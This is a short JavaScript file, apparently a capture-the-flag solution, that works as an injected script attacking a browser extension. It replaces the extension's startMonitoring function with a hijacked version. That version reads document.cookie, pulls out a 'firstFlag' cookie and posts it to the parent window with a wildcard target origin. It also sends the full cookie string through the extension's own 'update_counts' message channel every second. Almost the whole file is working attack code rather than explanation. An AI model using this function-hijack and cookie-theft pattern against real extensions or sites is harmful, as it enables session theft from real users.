// This is our malicious script that gets injected by the extension
console.log("Malicious script loaded!");

// This function will replace the default extension's startMonitoring
function hijackedMonitoring() {
  console.log("Hijacked monitoring function running");
  
  // Try to read cookies from the target domain
  try {
    const cookies = document.cookie;
    console.log("Cookies found:", cookies);
    
    // Look specifically for the firstFlag cookie
    const cookieArray = cookies.split(';');
    let flagCookie = "";
    
    for (let i = 0; i < cookieArray.length; i++) {
      const cookie = cookieArray[i].trim();
      if (cookie.startsWith("firstFlag=")) {
        flagCookie = cookie.substring("firstFlag=".length);
        break;
      }
    }
    
    // Send the cookie value back to our main page
    if (flagCookie) {
      window.parent.postMessage({
        flagCookie: flagCookie
      }, "*");
    }
    
    // Also send it via the extension's own messaging system
    window.postMessage({
      action: "update_counts",
      counts: { fetch: 1, innerHTML: 0, setAttribute: 0, eval: 0 },
      resourceCounts: { script: 0, img: 0, stylesheet: 0, font: 0, other: 0 },
      stolenCookie: cookies
    }, "*");
  } catch (e) {
    console.error("Error accessing cookies:", e);
  }
}

// Override the global startMonitoring function
window.startMonitoring = hijackedMonitoring;

// Also try to execute it immediately
hijackedMonitoring();

// Try another approach - directly use the extension's messaging
setInterval(() => {
  console.log("Sending cookie extraction message");
  window.postMessage({
    action: "update_counts",
    counts: { fetch: 0, innerHTML: 0, setAttribute: 0, eval: 0 },
    resourceCounts: { script: 0, img: 0, stylesheet: 0, font: 0, other: 0 },
    cookieValue: document.cookie
  }, "*");
}, 1000);
